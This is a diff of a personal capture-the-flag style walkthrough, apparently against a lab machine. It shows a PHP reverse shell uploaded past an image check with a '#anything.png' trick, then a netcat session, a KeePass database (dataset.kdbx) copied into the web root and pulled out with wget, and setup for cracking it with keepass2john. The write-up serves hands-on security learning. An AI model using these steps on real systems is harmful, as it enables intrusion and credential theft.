@@ -59,19 +59,75 @@ just a test with putting in potato.txt
 
 ![phpREvShell1](https://github.com/user-attachments/assets/9cb80a67-c471-41e3-9afd-43f1ecaf0ea1)
 </br>  mod the port to 1984 because, haha, funny.
+![resetAndRedo](https://github.com/user-attachments/assets/ccb8d61c-81de-4826-a911-6113839c265f)
+
+
 ![shellMod1](https://github.com/user-attachments/assets/89e66405-e2f1-4925-abcb-5edb00a7793f)
 
-spin up the python server so we can give the shell to the uploader
-python -m SimpleHTTPServer 7737
-
-(weird port number because others were in use)
-put into upload bar -->
-`http://10.10.228.228:7737/shell1.jpg`
+</br>spin up the python server so we can give the shell to the uploader
+</br>python -m SimpleHTTPServer 7737
+</br>
+</br>(weird port number because others were in use)
+</br>put into upload bar -->
+</br>`http://10.10.228.228:7737/shell1.jpg`
 ![tryWithPython3AndShell1](https://github.com/user-attachments/assets/b5f78b20-c36a-4645-ad6c-d2e9f2253971)
+
+</br>umm...
+</br>...
+</br>that didn't work so I gotta try something else... maybe a different port with python3 as the server?
+</br> (TIME LAPSE)
+</br> Went through all the steps again to get a new file of the php reverse shell called "sword.php", restarted everything because it wasn't working...
+
+![getNewUpload](https://github.com/user-attachments/assets/08e80277-27e2-4a59-bdb1-0a8d33b69f12)
+
+
+
+
 
 To fool the check for an image, we can bypass with #anything.png
 but we need to delete the hashtag and trailing junk when executing the file via URL.
 ![wrongNameShouldBeShell1](https://github.com/user-attachments/assets/8e53fa79-8134-45c1-a2f3-791f753cb765)
 
+
+</br> Ok, this is a big deal
+</br> make sure netcat is listening on the proper port before uploading...
+</br> the feedback url goes in the proper url without the # and following string junk. 
+</br> this causes a hang, but netcat catches a session
+![sessionGot2](https://github.com/user-attachments/assets/6f10435a-34cc-406a-9000-f0fdc4fc7f2b)
+
+</br>snooping around finds /opt has contents
+</br> this is arbitrary and there's no methodology for just figuring out where an interesting file is...
+![snoopRandomlyFindOptAfterWandering](https://github.com/user-attachments/assets/a845e1a4-ffba-4489-a75f-a591ddb658ef)
+
+</br>find / -user sysadmin 2>/dev/null
+</br>find stuff owned by user sysadmin (our current user)
+
+![interest409t3](https://github.com/user-attachments/assets/d36982ef-10f2-4607-8605-dd87db87e6db)
+
+</br>var/www/html is from whence we read webpages from in typical structures like wordpress.
+</br>(yes, I use "whence" because English is a peasant language without proper directional function words)
+</br>Saving files here prevents us from needing a python server spun up since the web server is already serving stuff up
+![shouldbeGrabbablewithwgetnow](https://github.com/user-attachments/assets/86a8d459-cfc9-44e3-a696-95e8fe8f73ef)
+
+</br>we find a "dataset.kdbx"
+</br>Just magic your way into knowing this is imporatant and we need "keepass" to read credentials from this saftey deposit box.
+</br> copy the dataset.kdbx into the var/www area
+</br> cp dataset.kdbx var/www/dataset.kdbx
+![gotItLocally](https://github.com/user-attachments/assets/32d672d0-71a2-484a-b314-08b95c4a5a2e)
+
+</br> this allows us to wget it without needing to host a server, as the web server is GET-able.
+</br>  wget 10.10.220.22/dataset.kdbx
+![gotItLocally](https://github.com/user-attachments/assets/2c5ad734-b8ae-4445-97d4-c4459b1955c9)
+
+</br> busting.kdbx is not available via a google dork...
+</br> eat dirt, google
+![fuckYouGoogle](https://github.com/user-attachments/assets/ed119a63-a203-4fe4-8390-7c0ad03a89db)
+</br> sudo apt install keepassxc
+</br>  ^^ need to be able to read the file with keepassxc... pound of flesh...
+</br> hacktricks does have some gidance here
+
+![managednorr23r](https://github.com/user-attachments/assets/30ffb52b-b3d1-42f1-85b3-fec6a2c3b0ef)
+
+got raw text for python file keepass2john from here : https://github.com/ivanmrsulja/keepass2john
 
 
